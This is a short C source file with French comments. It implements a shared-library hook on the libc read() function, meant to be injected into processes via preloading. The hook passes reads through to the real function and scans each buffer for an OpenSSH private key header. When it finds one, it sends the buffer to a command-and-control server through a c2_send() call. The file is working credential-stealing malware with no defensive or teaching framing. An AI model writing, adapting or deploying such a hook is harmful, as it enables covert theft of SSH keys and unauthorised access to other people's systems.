#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include "c2_client.h"   

static ssize_t (*real_read)(int, void*, size_t) = NULL;

ssize_t read(int fd, void *buf, size_t count) {
    // Charger la fonction d'origine
    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
        if (!real_read) {
            fprintf(stderr, "[hook_read] Erreur : impossible de charger read\n");
            _exit(1);
        }
    }

    // Appel de la vraie fonction read
    ssize_t ret = real_read(fd, buf, count);

    if (ret > 0) {
        // Juste un debug, on affiche le nombre d'octets interceptés
        fprintf(stderr, "[hook_read] fd=%d, %zd octets lus\n", fd, ret);

        // Chercher la séquence BEGIN OPENSSH PRIVATE KEY
        if (strstr((char *)buf, "BEGIN OPENSSH PRIVATE KEY")) {
            fprintf(stderr, "[hook_read] Clé SSH détectée ! Envoi au C2...\n");
            
            // Envoyer le contenu complet au C2
            c2_send((char *)buf);
            
            // Optionnel : log en local
            // log_credentials((char*)buf);
        }
    }

    return ret;
}
